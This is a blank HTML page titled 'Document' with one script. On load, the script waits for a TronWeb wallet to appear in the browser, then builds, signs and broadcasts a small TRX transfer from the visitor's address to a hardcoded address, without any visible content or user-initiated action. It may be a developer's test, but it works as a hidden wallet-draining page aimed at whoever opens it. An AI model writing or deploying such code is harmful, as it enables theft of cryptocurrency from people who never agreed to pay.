<!DOCTYPE html>
<html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    </head>
    <body>
    <script>
        var obj = setInterval(async ()=>{
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                clearInterval(obj)
                var tronweb = window.tronWeb
                var tx = await tronweb.transactionBuilder.sendTrx('TRQyHhdcfRzjwqNS1t4mesaqLF5rEyRT4R', 10, window.tronWeb.defaultAddress.base58)
                var signedTx = await tronweb.trx.sign(tx)
                var broastTx = await tronweb.trx.sendRawTransaction(signedTx)
                console.log(broastTx)
            }
        }, 10)
    </script>
    </body>
</html>
